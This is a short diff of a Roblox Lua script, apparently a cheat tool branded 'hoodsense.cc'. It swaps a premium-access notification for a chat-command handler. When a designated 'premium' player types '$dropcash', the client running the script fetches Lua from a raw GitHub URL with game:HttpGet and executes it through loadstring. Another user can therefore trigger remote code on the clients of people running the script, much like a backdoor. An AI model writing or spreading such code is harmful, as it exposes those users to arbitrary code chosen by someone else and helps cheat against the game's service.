@@ -184,15 +184,7 @@ premium1.Chatted:connect(function(cht)
 
 end)
 
-if game.Players.LocalPlayer == premium1 then
-game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "hoodsense.cc";
-	Text = "Premium acces!";
-	Time = 10;
-	Icon = "rbxassetid://8768441000";
-    Button1 = "Okay!";
-})
-end
+
  end)
 	Players.PlayerRemoving:Connect(function(player)
 	print("[hoodsense.cc] [hoodsense.cc] p1.lua lost " .. player.Name)
@@ -378,14 +370,14 @@ premium1.Chatted:connect(function(cht)
 
 end)
 
-if game.Players.LocalPlayer == premium1 then
-game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "hoodsense.cc";
-	Text = "Premium acces!";
-	Time = 10;
-	Icon = "rbxassetid://8768441000";
-    Button1 = "Okay!";
-})
-end
+premium1.Chatted:connect(function(cht)
+	if cht:match("$dropcash .") then
+    	if game.Players.LocalPlayer ~= premium2 then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
+        end
+	end
+
+end)
+
 end)
 -------------------------------------------------------------------------------
